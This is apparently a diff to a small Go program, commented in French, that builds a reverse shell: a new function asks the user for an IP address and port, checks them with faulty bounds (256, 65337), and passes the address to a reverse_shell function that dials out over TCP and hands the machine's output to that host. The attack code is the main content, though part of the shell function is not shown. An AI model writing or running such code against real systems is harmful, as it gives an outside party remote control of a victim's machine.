@@ -6,15 +6,75 @@ import (
 	"os"
 	"os/exec"
 	"time"
+	"strconv"
+    	"strings"
 )
+
+func verif_user() {
+
+    var host string
+    var port string
+    var addr string
+
+    for {
+        fmt.Println("entrez votre ip : ")
+        fmt.Scan(&host)
+        a := strings.Split(host, ".")
+
+        count := 0
+        for x := 0; x < len(a); x++ {
+
+            if len(a) != 4 {
+                count++
+                break
+            }
+
+            tmp := 0
+            tmp, err := strconv.Atoi(a[x])
+            if err != nil {
+                panic(err)
+                fmt.Println("la valeur entrée n'est pas la bonne")
+                break
+            }
+            if (x == 0 && tmp <= 0 || tmp > 256) || (tmp < 0 || tmp > 256) {
+                count++
+            }
+        }
+        if count == 0 {
+            break
+        }
+    }
+
+    for {
+
+        fmt.Println("entrez votre port : ")
+        fmt.Scan(&port)
+
+        tmp2, err := strconv.Atoi(port)
+
+        if err != nil {
+            fmt.Println("il y a une erreur")
+        }
+
+        if tmp2 > 0 && tmp2 < 65337 {
+            break
+        }
+    }
+    addr = host + ":" + port
+
+    reverse_shell (addr)
+}
+
 
 /*
 La fonction shell est ici pour faire du reverse shell, le parametre de la fonction est au format IP:PORT
 */
 func reverse_shell(host string) {
 
+
 	stderr := os.Stderr
 	stdout := os.Stdout
+
 
 	conn, err := net.Dial("tcp", host) // appell TCP sur l'ip:port
 	if err != nil {                    // verification des erreurs
@@ -44,6 +104,6 @@ func reverse_shell(host string) {
 
 func main() {
 
-	reverse_shell("127.0.0.1:7777")
+	verif_user()
 
 }
